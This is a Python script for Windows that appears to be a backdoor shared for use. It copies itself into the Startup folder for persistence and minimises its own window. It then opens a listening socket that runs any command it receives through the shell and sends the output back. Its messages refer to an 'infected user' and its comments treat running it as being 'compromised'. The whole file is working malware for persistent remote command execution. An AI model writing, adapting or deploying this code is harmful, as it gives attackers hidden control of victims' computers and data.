import socket
import subprocess
import win32gui
import win32con
import os
import sys
import winshell
from win32com.client import Dispatch

#your computer has likely been compromised if you ran this lmao

SERVER_IP = '127.0.0.1'
SERVER_PORT = 8081


def pin_to_windows_startup():
    startup_folder = winshell.startup()
    script_path = os.path.abspath(sys.argv[0])
    shortcut_path = os.path.join(startup_folder, os.path.splitext(os.path.basename(script_path))[0] + '.lnk')
    shell = Dispatch('WScript.Shell')
    shortcut = shell.CreateShortCut(shortcut_path)
    shortcut.Targetpath = script_path
    shortcut.WorkingDirectory = os.path.dirname(script_path)
    shortcut.save()
    print('Script pinned to Windows startup.') #remove this if you want
pin_to_windows_startup()

def minimize_window():
    window = win32gui.GetForegroundWindow()
    win32gui.ShowWindow(window, win32con.SW_MINIMIZE)
minimize_window()

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind((SERVER_IP, SERVER_PORT))
server_socket.listen(1)

print(f'Server listening on {SERVER_IP}:{SERVER_PORT}') #remove this if you want aswell

while True:
    client_socket, client_address = server_socket.accept()

    welcome_msg = 'Welcome to the server! The infected user has been connected successfully! '
    client_socket.send(welcome_msg.encode())

    while True:
        command = client_socket.recv(1024).decode()

        if command.lower() == 'exit':
            print('Client has closed the connection.')
            break

        try:
            process = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                universal_newlines=True
            )

            for line in iter(process.stdout.readline, ''):
                client_socket.send(line.encode())

            client_socket.send(b'')

        except subprocess.CalledProcessError as e:
            output = str(e)
            client_socket.send(output.encode())

        if not line:
            break

    client_socket.close()
